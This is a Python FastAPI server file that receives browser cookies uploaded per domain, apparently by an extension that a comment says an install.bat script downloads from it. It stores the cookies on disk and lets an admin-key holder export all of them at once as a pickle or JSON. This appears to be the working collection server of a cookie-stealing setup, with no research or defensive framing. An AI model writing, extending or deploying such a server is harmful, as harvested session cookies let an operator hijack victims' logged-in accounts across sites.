import json, pickle, os
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI()

UPLOAD_KEY = os.getenv("UPLOAD_KEY", "YOUR_UPLOAD_KEY")
ADMIN_KEY = os.getenv("ADMIN_KEY", "YOUR_ADMIN_KEY")
DATA_DIR = "cookie_data"
os.makedirs(DATA_DIR, exist_ok=True)

# Serve extension files for install.bat to download
if os.path.exists("extension"):
    app.mount("/extension", StaticFiles(directory="extension"), name="extension")


@app.post("/api/cookies")
async def upload_cookies(request: Request):
    if request.headers.get("x-api-key") != UPLOAD_KEY:
        raise HTTPException(403, "Forbidden")

    data = await request.json()
    domain = data.get("domain", "unknown").replace("/", "_")  # sanitize filename
    filepath = os.path.join(DATA_DIR, f"{domain}.json")

    with open(filepath, "w") as f:
        json.dump(data, f)

    return {"status": "ok", "domain": domain}


@app.get("/api/cookies")
async def download_cookies(request: Request):
    if request.headers.get("x-admin-key") != ADMIN_KEY:
        raise HTTPException(403, "Forbidden")

    all_cookies = {}
    for fname in os.listdir(DATA_DIR):
        if not fname.endswith(".json"):
            continue
        with open(os.path.join(DATA_DIR, fname)) as f:
            data = json.load(f)
            all_cookies[data.get("domain", fname)] = data

    pkl_path = os.path.join(DATA_DIR, "_export.pkl")
    with open(pkl_path, "wb") as f:
        pickle.dump(all_cookies, f)

    return FileResponse(pkl_path, filename="cookies.pkl", media_type="application/octet-stream")


@app.get("/api/cookies/json")
async def download_cookies_json(request: Request):
    if request.headers.get("x-admin-key") != ADMIN_KEY:
        raise HTTPException(403, "Forbidden")

    all_cookies = {}
    for fname in os.listdir(DATA_DIR):
        if not fname.endswith(".json"):
            continue
        with open(os.path.join(DATA_DIR, fname)) as f:
            all_cookies[fname.replace(".json", "")] = json.load(f)

    return all_cookies
